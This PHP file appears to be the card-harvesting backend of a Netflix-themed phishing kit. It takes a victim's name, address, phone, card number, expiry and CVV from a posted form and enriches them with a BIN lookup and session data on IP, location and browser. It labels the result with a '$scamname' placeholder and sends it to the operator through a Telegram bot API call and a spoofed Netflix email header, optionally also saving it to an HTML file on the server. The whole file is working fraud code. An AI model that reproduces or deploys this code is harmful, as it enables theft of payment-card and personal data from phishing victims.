<?php
/*  

       ▄▄                       ▄▄                            
        ███                     ▀███                            
         ██                       ██                            
 ▄██▀███ ███████▄  ▄█▀██▄    ▄█▀▀███   ▄██▀██▄▀██▀    ▄█    ▀██▀
 ██   ▀▀ ██    ██ ██   ██  ▄██    ██  ██▀   ▀██ ██   ▄███   ▄█  
 ▀█████▄ ██    ██  ▄█████  ███    ██  ██     ██  ██ ▄█  ██ ▄█   
 █▄   ██ ██    ██ ██   ██  ▀██    ██  ██▄   ▄██   ███    ███    
 ██████▀ ███  ████▄████▀██▄ ▀████▀███▄ ▀█████▀     █      █     
                                                               
                                                               



*/
if(isset($_POST['cnm'])&&isset($_POST['csc'])){session_start();include'../mine.php';include'../../prevents/anti2.php';function cardData($bin){$ch=curl_init();curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_URL,"https://api.freebinchecker.com/bin/".$bin);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);curl_setopt($ch,CURLOPT_TIMEOUT,10);$json=json_decode(curl_exec($ch),true);curl_close($ch);if(!isset($json)||$json['valid']==false||$json==NULL){return"N/A";}
return $json;}
$ctp=$_POST['ctp'];$ccn=str_replace(' ','',$_POST['cnm']);$cex=$_POST['exp'];$csc=$_POST['csc'];$fnm=$_POST['fnm'];$adr=$_POST['adr'];$cty=$_POST['cty'];$zip=$_POST['zip'];$phn=$_POST['phn'];$stt=$_POST['stt'];$cnt=$_POST['cnt'];$bin=substr($ccn,0,6);$bin_data=cardData($bin);$bin_type=$bin_data["card"]['type'];$bin_level=$bin_data["card"]['category'];$bin_brand=$bin_data["card"]['scheme'];$bin_currency=$bin_data['country']['currency'];$bin_bank=$bin_data['issuer']['name'];$bin_country=$bin_data['country']['name'];$_SESSION['bank']=$bin_bank;$_SESSION['fname']=$fnm;$_SESSION['ctype']=$ctp;	
	$msg .= "⚜️ NETFLIX INFO ⚜️
	⚜️ NETFLIX INFO BY ".$scamname." ⚜️ 
FULL NAME = {$fnm}
ADDRESS = {$adr}
PHONE = {$phn}
℗ ZIP CODE = {$zip}
℗ CITY = {$cty}
℗ STATE = {$stt}
℗ COUNTRY = {$cnt}
±±±±±±±±±±±±±±💳 CC Info 💳
✪ CC Brand = {$ctp}
✪ CC Number = {$ccn}
✪ CC Expiry = {$cex}
✪ CVV / CSC = {$csc}
±±±±±±±±±±±±±±[ BIN Info {$bin}]±±±±±±±±±±±±±±±±±±±<br>
✪ [CC Data] ={$bin_brand} {$bin_type} {$bin_level} -> {$bin_currency}
[CC Brand] = {$bin_bank}
[CC Brand] = {$bin_country}
±±±±±±±±±±±±±±[ IP LOOKUP INFORMATION]±±±±±±±±±±±±±±±±±±±<br>
✪COMPUTER = {$_SESSION['computer']}
✪IP ADDRESS	={$_SESSION['ip']}
✪LOCATION = {$_SESSION['ip_city']} , {$_SESSION['ip_state']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}
✪BROWSER = {$_SESSION['browser']} on {$_SESSION['os']}
✪TIMEZONE	= {$_SESSION['ip_timezone']}
################## <[  ⚜️ NETFLIX BY ".$scamname." ⚜️ ]>
<br></div></html>\n";
if($saveintext=="yes"){$save=fopen("../../".$filename.".html","a+");fwrite($save,$msg);fclose($save);}
$subject=" 💳 NETFLIX INFO 💳 [{$bin} {$ctp}] From [{$_SESSION['ip_countryName']}] {$_SESSION['ip']}";$headers="From: ⚜️ Netflix ⚜️ <newlogin@shadow.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/html; charset=UTF-8\r\n";if($sendtotele=="yes"){$data = [
      'chat_id' => $yours,
      'text' => $msg
  ];
file_get_contents("https://api.telegram.org/bot$apitoken/sendMessage?" .
                                 http_build_query($data));}
exit('done');}
?>